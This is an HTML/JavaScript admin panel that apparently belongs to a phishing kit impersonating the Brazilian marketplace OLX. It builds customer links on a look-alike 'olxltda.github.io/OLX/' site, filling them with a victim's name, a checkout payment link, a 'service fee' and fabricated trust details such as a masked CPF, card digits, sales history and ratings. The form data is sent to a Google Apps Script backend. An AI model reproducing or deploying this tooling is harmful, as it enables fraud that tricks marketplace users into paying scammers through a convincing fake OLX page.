<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin - Gerador de Links OLX</title>
<style>
  /* --- ESTILOS (Visual Dark Mode) --- */
  body { background:#1e1e1e; color:#fff; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px; margin:0; }
  
  form { 
    max-width:500px; margin:0 auto; background:#2b2b2b; padding:30px; 
    border-radius:12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  }
  
  h2 { text-align:center; color:#00bfa5; margin-top:0; }
  
  label { 
    display:block; font-size: 12px; color: #ccc; 
    text-transform: uppercase; font-weight: bold; margin-top: 15px; 
  }
  
  input { 
    width:100%; padding:12px; margin-top:5px; background:#3a3a3a; 
    border:1px solid #444; color:#fff; border-radius:6px; box-sizing: border-box; 
    font-size: 15px; transition: 0.3s;
  }
  input:focus { border-color: #00bfa5; outline: none; background: #444; }
  
  button#btnSalvar { 
    width:100%; padding:15px; background:#00bfa5; border:none; 
    border-radius:8px; color:#fff; font-weight:bold; cursor:pointer; 
    font-size: 16px; margin-top: 25px; transition: 0.2s;
  }
  button#btnSalvar:hover { background:#009e8e; transform: translateY(-2px); }
  button:disabled { background: #555; cursor: not-allowed; opacity: 0.7; }
  
  /* --- MODAL --- */
  .modal { 
    display:none; position:fixed; top:0; left:0; width:100%; height:100%; 
    background:rgba(0,0,0,0.9); align-items:center; justify-content:center; z-index: 1000;
  }
  .modal.active { display:flex; animation: fadeIn 0.3s; }
  
  .modal-box { 
    background:#222; padding:30px; border-radius:10px; text-align:center; 
    max-width:450px; width: 90%; border: 1px solid #444; box-shadow: 0 0 50px rgba(0,191,165,0.2);
  }
  
  .link-display { 
    background:#111; padding:15px; color:#00bfa5; word-break:break-all; 
    margin:20px 0; border-radius:5px; font-family: monospace; border: 1px dashed #333;
  }
  
  .btn-action { 
    padding:12px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; width: 100%; margin-bottom: 10px;
  }
  .btn-copy { background:#fff; color:#000; }
  .btn-new { background:transparent; color:#888; border: 1px solid #444; }
  .btn-new:hover { color: #fff; border-color: #fff; }

  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
</style>
</head>
<body>

<form id="adminForm">
  <h2>Novo Pedido</h2>
  
  <label>Nome do Comprador</label>
  <input type="text" name="comprador" required placeholder="Nome completo">
  
  <label>Link Pagamento (Checkout)</label>
  <input type="text" name="linkPagamento" id="linkPagamento" placeholder="https://go.perfectpay...">

  <label>Taxa de Serviço</label>
  <input type="text" name="taxa" class="money" placeholder="R$ 0,00">

  <hr style="border:0; border-top:1px solid #444; margin: 20px 0;">
  <p style="font-size:12px; color:#888; text-align:center; letter-spacing:1px;">DADOS PRÉ-DEFINIDOS</p>

  <label>Valor Total</label>
  <input type="text" name="valor" class="money" value="R$ 1.000,00">

  <label>Prazo</label>
  <input type="text" name="prazo" value="12 horas">

  <label>Frete</label>
  <input type="text" name="frete" class="money" value="R$ 0,00">

  <label>Tarifa</label>
  <input type="text" name="tarifa" class="money" value="R$ 0,00">

  <label>CPF Mascarado</label>
  <input type="text" name="cpf" value="406.***.***.01">

  <label>Cartão Mascarado</label>
  <input type="text" name="cartao" value="Mastercard 4588">

  <label>Histórico de Vendas</label>
  <input type="text" name="vendas" value="08 Vendas nos últimos 06 meses">

  <label>Avaliação Atendimento</label>
  <input type="text" name="atendimento" value="Avaliação 4.7/5.0">

  <label>Taxa de Entrega</label>
  <input type="text" name="entrega" value="Taxa de entregues no prazo 07/08">

  <button type="submit" id="btnSalvar">Gerar Link do Cliente</button>
</form>

<div class="modal" id="modalSuccess">
  <div class="modal-box">
    <h3 style="color:#00bfa5; margin-top:0;">Link Gerado com Sucesso!</h3>
    <p style="color:#aaa; font-size:14px;">Envie este link para o cliente acessar os dados.</p>
    
    <div class="link-display" id="finalLink">...</div>
    
    <button class="btn-action btn-copy" id="btnCopy">Copiar Link</button>
    <button class="btn-action btn-new" onclick="location.reload()">Criar Novo Pedido</button>
  </div>
</div>

<script>
// ========================================================
// ⚙️ CONFIGURAÇÃO
// ========================================================

const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
const CLIENTE_URL = 'https://olxltda.github.io/OLX/'; 

// ========================================================

const form = document.getElementById('adminForm');
const modal = document.getElementById('modalSuccess');
const linkDisplay = document.getElementById('finalLink');
const btnSalvar = document.getElementById('btnSalvar');
const btnCopy = document.getElementById('btnCopy');

// --- 1. LÓGICA DE MÁSCARA DE MOEDA (R$) ---
const moneyInputs = document.querySelectorAll('.money');

const formatMoney = (value) => {
  // Remove tudo que não é dígito
  value = value.replace(/\D/g, "");
  
  // Converte para float (divide por 100 para ter centavos)
  // Se estiver vazio, assume 0
  const amount = parseFloat(value) / 100;
  
  // Formata usando a API nativa do navegador para BRL
  return amount.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL'
  });
};

moneyInputs.forEach(input => {
  // Evento ao digitar
  input.addEventListener('input', (e) => {
    e.target.value = formatMoney(e.target.value);
  });

  // Formatação inicial caso já tenha valor no HTML (ex: R$ 1.000,00)
  // Apenas garante que o formato está correto
  if(input.value) {
    // Pequeno hack: remove formatação antiga e reaplica
    const cleanVal = input.value.replace(/\D/g, "");
    if(cleanVal) input.value = formatMoney(cleanVal);
  }
});

// --- 2. RECUPERAR ÚLTIMO LINK USADO (Memória) ---
document.addEventListener('DOMContentLoaded', () => {
  const lastLink = localStorage.getItem('lastPaymentLink');
  const linkInput = document.getElementById('linkPagamento');
  
  if (lastLink) {
    linkInput.value = lastLink;
  }
});

// --- 3. ENVIO DO FORMULÁRIO ---
form.addEventListener('submit', async (e) => {
  e.preventDefault();
  
  btnSalvar.textContent = "Processando...";
  btnSalvar.disabled = true;

  // Salva o link atual na memória para a próxima vez
  const currentLink = document.getElementById('linkPagamento').value;
  if(currentLink) {
    localStorage.setItem('lastPaymentLink', currentLink);
  }

  const data = {};
  new FormData(form).forEach((v, k) => data[k] = v);

  try {
    const res = await fetch(BACKEND_URL, {
      method: 'POST',
      redirect: 'follow', 
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: JSON.stringify(data)
    });
    
    const json = await res.json();

    if (json.status === 'success') {
      const linkPronto = `${CLIENTE_URL}?id=${json.id}`;
      linkDisplay.textContent = linkPronto;
      modal.classList.add('active');
    } else {
      alert('Erro do Servidor: ' + json.message);
    }

  } catch (err) {
    console.error(err);
    alert('Erro de conexão!');
  } finally {
    btnSalvar.textContent = "Gerar Link do Cliente";
    btnSalvar.disabled = false;
  }
});

btnCopy.addEventListener('click', () => {
  navigator.clipboard.writeText(linkDisplay.textContent);
  const original = btnCopy.textContent;
  btnCopy.textContent = "Copiado!";
  btnCopy.style.background = "#4CAF50";
  setTimeout(() => {
    btnCopy.textContent = original;
    btnCopy.style.background = "#fff";
  }, 2000);
});
</script>

</body>
</html>
